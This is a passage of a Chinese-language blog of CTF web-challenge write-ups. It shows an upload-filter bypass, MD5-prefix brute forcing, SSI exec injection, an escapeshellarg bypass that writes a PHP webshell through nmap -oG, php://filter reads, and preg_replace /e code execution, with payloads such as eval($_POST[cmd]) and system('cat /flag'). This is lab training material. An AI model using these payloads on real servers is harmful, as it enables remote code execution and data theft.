&#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;h2 title&quot;&gt;&#x27;</span>.<span class="hljs-variable">$msg</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;h3 title&quot;&gt;exif_imagetype not image!&lt;/div&gt;&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$fn</span> = <span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&quot;.*&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;cc-profile-image&quot;&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;images/anthony.jpg&quot; alt=&quot;Image&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注册成功后报错，猜测可能有注入点。先放在这里，继续登陆。发现是上传头像，那猜测可能有文件上传漏洞了</p><p>exif_imagetype函数，很常见的了，判断文件头是否是图片。</p><p>那我先传入一个图片马，上传成功。但是发现无论是.htaccess，还是各种格式的都无法上传成功，图片马也无法利用。</p><p>这时猜测是否能通过web应用程序解析漏洞绕过。报错网页，发现是apache</p><blockquote><p>由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，jpg等扩展名是apache不能识别的，</p></blockquote><p>因此如果一个文件名为1.php.gif。就会直接将类型识别为php，从而达到了注入php代码的目的</p><p>但是这里又无法上传成功，很奇怪。这里测试了一会，发现反着利用就可以了，上传1.jpg.php</p><p>看图片链接，发现上传路径&#x2F;uploads。然后最奇特的一点，jpg好像被过滤成空了，直接是php文件了。那就直接利用。蚁剑连接，在根目录下找到flag</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>通过扫后台发现index.php.swp备份</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><br>***<br><br>​    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>​    &#123;<br>​        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>​        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>​            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>​            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>​            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>​            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">***</span><br><span class="hljs-string"></span><br><span class="hljs-string">​***&#x27;</span>;<br>​            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>​            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br><br>***<br><br>​<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>​        &#125; <span class="hljs-keyword">else</span> &#123;<br>​            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>​            <br><br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>    ***<br>    &#125;<br>    ***<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;6d0bc1&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>2020666<br>2305004<br>9162671</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">2020666</span><br></code></pre></td></tr></table></figure><p>抓包得到Url_is_here: public&#x2F;5a9c9895628d4de6662c576d8b2039658d972752.shtml</p><p><a href="https://www.wenjianbaike.com/shtml.html">https://www.wenjianbaike.com/shtml.html</a></p><p>能根据命令动态回显网页的某个部分，比如时间。可以注入，用来远程命令执行。</p><!--#exec cmd="命令"--><p>这里的username为注入点</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>打开flag_990c66bf85a09c664f0b6741840499b2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure><p>注意因为是上级目录，所以要保留..&#x2F;<br>回显得到flag</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>知识点：<code>nmap -oG 写入文件</code>、<code>-iL读取扫描文件</code>、<code>escapeshellarg</code>绕过（<a href="https://paper.seebug.org/164/%EF%BC%89">https://paper.seebug.org/164/）</a></p><p>解法：<strong>nmap</strong>扫描结果写入文件时加入一句话木马，需要绕过<code>escapeshellarg()</code>函数</p><p>页面类似<strong>Nmap</strong>的功能，一个输入命令行，提示输入<code>ip</code>地址，尝试输入正常内容：<code>127.0.0.1</code></p><p>有回显，尝试命令执行，使用 <code>|</code>分隔ip地址与命令，未成功，<code>|</code>被<code>\</code>转义</p><p>查阅<code>escapeshellarg</code>函数的资料，发现存在绕过漏洞：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><p>传入参数：127.0.0.1’ -v -d a&#x3D;1<br>经过escapeshellarg()函数处理后变为：’127.0.0.1’&#39;‘ -v -d a&#x3D;1’，也就是将其中的’单引号转义，再用单引号将内容包含起来<br>处理完的字符串再通过escapeshellcmd()函数的处理，变成：’127.0.0.1’\‘’ -v -d a&#x3D;1&#39;，因为escapeshellcmd()函数对\以及最后的未闭合的’进行了转义<br>由于两次函数的处理，最终参数可简化成：127.0.0.1\ -v -d a&#x3D;1’，因为包围127.0.0.1的单引号产生了闭合，\被解释为\，中间的两个单引号’’完成了闭合，最终留下了a&#x3D;1’，也就是末尾的单引号。<br>结合本题环境，常用的命令注入方法都不行，题目环境为Nmap扫描，查阅到Nmap可以写入文件，其中参数-oG可以实现将命令和结果写入文件，尝试构造如下Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span> -oG hack.php<br></code></pre></td></tr></table></figure><p>简单写入一句话木马，会被<code>escapeshellarg()</code>与<code>escapeshellcmd()</code>函数处理为：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> \&lt;\?php <span class="hljs-title">@eval</span>\(\)\<span class="hljs-comment">;\?\&gt; -oG hack.php&#x27;</span><br></code></pre></td></tr></table></figure><p>因为两端单引号闭合，所以一句话木马只是被当成了字符串处理。</p><p>所以需要闭合所有的单引号，将一句话木马变成一条命令，尝试在<strong>Payload</strong>前后均加上<code>&#39;</code>单引号：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27;127.0.0.1 </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG hack.php&#x27;</span><br></code></pre></td></tr></table></figure><p>处理后所有的单引号均已闭合，最终可简化为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">\<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>();<span class="hljs-meta">?&gt;</span> -oG hack.php<br></code></pre></td></tr></table></figure><p>命令成功执行，给出了文件保存位置，使用蚁剑连接</p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传两个参数text和file，要求file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”I have a dream”</p><p>text用php:&#x2F;&#x2F;input绕过</p><p>file用php:&#x2F;&#x2F;filter读取</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-keyword">next</span>.php&amp;text=php:<span class="hljs-regexp">//i</span>nput<br></code></pre></td></tr></table></figure><p>post上传一个<code>I have a dream</code></p><p>得到next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>preg_replace</code>的一个RCE漏洞<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p><strong>payload：&#x2F;?.*&#x3D;{${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">原先的语句： preg_replace(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br>变成了语句： preg_replace(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;<span class="hljs-variable">$&#123;phpinfo()&#125;</span>&#125;);<br></code></pre></td></tr></table></figure><p>但我们的 <strong>.*</strong> 是通过 <strong>GET</strong> 方式传入，你会发现无法执行 <strong>phpinfo</strong> 函数</p><p>在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。</p><p>我们传上去的 <strong>.*</strong> 变成了 <strong>_*</strong> </p><p>换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。</p><p> <strong>payload</strong> ： <strong>\S*&#x3D;${phpinfo()}</strong></p><p>坑：为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p><p>payload：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">/<span class="hljs-keyword">next</span>.php?\S*=$&#123;<span class="hljs-built_in">eval</span>($_POST[cmd])&#125;<br></code></pre></td></tr></table></figure><p>同时Post传</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/next.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>伪随机数构造</p><p><img src="https://i.imgs.ovh/2023/11/20/HO4VI.png" alt="image-20231120210805143"></p><p>源代码发现check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;check.php&quot;</span>); <br></code></pre></td></tr></table></figure><p>含有mt_rand函数，<a href="https://www.freebuf.com/vuls/192012.html">PHP mt_rand安全杂谈及应用场景详解</a></p><p>1.伪随机数（引用上面的链接内容）<br>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p><p>mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p><p>所以：大致过程就明了了，我们根据已经给出的部分随机数，利用工具找出seed（种子），然后得到完整的随机数。</p><p>2.将已知部分伪随机数转化为php_mt_seed工具可以看懂的数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">str1 =<span class="hljs-string">&#x27;fjoC9Ygwj7&#x27;</span><br>str2 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>result =<span class="hljs-string">&#x27;&#x27;</span><br><br><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str2)-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str1)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(str2)):<br>        <span class="hljs-keyword">if</span> str1<span class="hljs-selector-attr">[i]</span> ==  str2<span 